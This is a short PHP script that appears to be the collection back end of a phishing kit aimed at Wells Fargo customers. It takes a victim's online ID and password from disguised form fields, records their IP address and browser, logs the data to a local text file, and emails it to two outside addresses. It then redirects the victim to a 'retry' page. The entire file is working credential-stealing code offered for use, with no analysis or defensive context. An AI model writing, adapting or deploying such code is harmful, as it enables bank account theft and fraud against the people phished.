<?php

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "------------------------------| WF01 |-----------------------------\n";
$message .= "Online ID: ".$_POST['snake']."\n";
$message .= "Password: ".$_POST['monkey']."\n";
$message .= "IP Address : $ip\n";
$message .= "--------------------\n";
$message .= "Date : $date\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "***************ILA***************\n";
$message .= "* no pain, no gain *\n";
$myfile = fopen("919a.txt", "a");
fwrite($myfile, $message);
fclose($myfile);

$send="rotastaff@yahoo.com,ayo.osha@yandex.com";



$subject = "wf - IP: ".$ip."\n ";
$headers = "";
$str=array($send); foreach ($str as $send)
if(mail($send,$subject,$message,$headers) != false){

header("Location: retry.php?action=processing");
}

?>